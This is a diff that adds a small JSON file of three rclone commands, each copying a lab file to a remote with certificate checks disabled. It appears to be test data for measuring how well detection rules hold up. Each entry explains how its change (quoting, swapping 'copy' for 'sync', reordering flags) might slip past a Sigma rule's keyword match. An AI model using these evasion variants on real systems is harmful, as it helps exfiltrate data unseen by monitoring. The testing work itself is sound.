@@ -1,0 +1,14 @@
+[
+  {
+    "output": "rclone copy \"C:\\Lab\\input\\sample.txt\" remote:backup --no-check-certificate",
+    "explanation": "Insertion: Added quotes around the source path to avoid triggering the 'copy' keyword match directly in the command line."
+  },
+  {
+    "output": "rclone sync \"C:\\Lab\\input\\sample.txt\" remote:backup --no-check-certificate",
+    "explanation": "Substitution: Replaced 'copy' with 'sync', which is another valid rclone operation, but may not trigger the same detection pattern."
+  },
+  {
+    "output": "rclone --no-check-certificate copy \"C:\\Lab\\input\\sample.txt\" remote:backup",
+    "explanation": "Reordering: Changed the order of the '--no-check-certificate' flag and 'copy' command to potentially avoid matching the Sigma rule's keyword sequence."
+  }
+]
